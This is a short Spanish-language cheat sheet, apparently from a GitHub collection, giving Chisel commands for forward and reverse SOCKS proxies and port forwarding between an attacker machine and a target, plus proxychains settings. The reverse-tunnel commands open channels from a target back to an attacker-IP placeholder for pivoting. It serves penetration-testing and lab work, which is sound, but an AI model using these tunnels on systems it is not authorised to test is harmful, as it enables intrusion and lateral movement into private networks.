# Chisel Cheat Sheet

## Forward Dynamic SOCKS Proxy

#### Ejecute servidor Chisel en el equipo destino.
```
chisel server --socks5 --port <PORT-CHISEL>
```

#### Ejecute cliente Chisel en el equipo atacante.
```
chisel client <TARGET-IP>:<PORT-CHISEL> <ATTACK-PORT>:socks
```

##### Modificar archivo /etc/proxychains..conf agregando:
```
...
socks5  127.0.0.1   <ATTACK-PORT>
```

## Reverse Dynamic SOCKS Proxy

#### Ejecute servidor Chisel en equipo atacante.
```
chisel server --reverse --port <PORT-CHISEL>
```

#### Ejecute cliente Chisel en el equipo destino.
```
chisel client <ATTACK-IP>:<PORT-CHISEL> R:1080:socks
```

##### Modificar archivo /etc/proxychains..conf agregando:
```
...
socks5  127.0.0.1   1080
```

## Reverse Port Forwarding

#### Ejecute servidor Chisel en equipo atacante.
```
chisel server --reverse --port <PORT-CHISEL>
```

#### Ejecute cliente Chisel en equipo destino.
```
chisel client <ATTACK-IP>:<PORT-CHISEL> R:<ATTACK-PORT>:127.0.0.1:<TARGET-PORT>
```

## Port Forwarding

#### Ejecutar servidor Chisel en equipo destino.
```
chisel server --port <PORT-CHISEL>
```

#### Ejecutar cliente Chisel en equipo atacante.
```
chisel client <TARGET-IP>:<PORT-CHISEL> <ATTACK-PORT>:<TARGET-IP>:<TARGET-PORT>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)